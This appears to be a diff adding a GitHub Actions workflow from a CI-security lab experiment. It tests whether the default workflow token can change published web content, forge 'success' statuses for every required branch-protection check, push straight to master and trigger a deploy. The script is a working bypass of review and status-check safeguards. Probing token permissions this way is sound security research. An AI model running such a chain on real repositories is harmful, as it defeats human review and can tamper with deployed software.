@@ -1,0 +1,48 @@
+name: exp3-chain
+# Experiment 3: from a job with the default (write) workflow token, change the published
+# content, self-certify the commit against every required status check, push the default
+# branch, and dispatch the deploy workflow. No `permissions:` block.
+on:
+  workflow_dispatch:
+
+jobs:
+  chain:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Change published content, self-certify, push master, dispatch deploy
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set +e
+          git config user.name  "ci-lab-bot"
+          git config user.email "ci-lab-bot@users.noreply.github.com"
+          printf '<!doctype html><title>lab</title><h1>content written by the workflow token</h1>\n<p>run %s</p>\n' \
+            "$GITHUB_RUN_ID" > web/index.html
+          git add web/index.html
+          git commit -q -m "exp3 content change (${GITHUB_RUN_ID})"
+          SHA=$(git rev-parse HEAD)
+          echo "CANDIDATE_SHA=$SHA"
+          git push origin "HEAD:refs/heads/probe/exp3-${GITHUB_RUN_ID}" > /dev/null 2>&1
+          echo "SIDE_BRANCH_PUSH_EXIT=$?"
+          CTXS=$(curl -sS -H "Authorization: Bearer $GH_TOKEN" \
+            "https://api.github.com/repos/$GITHUB_REPOSITORY/branches/master" \
+            | python3 -c 'import json,sys;print(" ".join(json.load(sys.stdin)["protection"]["required_status_checks"]["contexts"]))')
+          echo "REQUIRED_CONTEXTS: $CTXS"
+          for ctx in $CTXS; do
+            printf '{"state":"success","context":"%s","description":"self-certified by the workflow token"}' "$ctx" > st.json
+            curl -sS -o /dev/null -w "  POST /statuses -> %{http_code} for context ${ctx}\n" -X POST \
+              -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+              --data-binary @st.json \
+              "https://api.github.com/repos/$GITHUB_REPOSITORY/statuses/$SHA"
+          done
+          git push origin HEAD:master > p.txt 2>&1
+          echo "PUSH_EXIT_STATUS=$?"
+          cat p.txt
+          echo "--- dispatch exp3-deploy.yml on master with the same token ---"
+          curl -sS -w '\nHTTP_STATUS=%{http_code}\n' -X POST \
+            -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            -d '{"ref":"master"}' \
+            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows/exp3-deploy.yml/dispatches"
+          exit 0
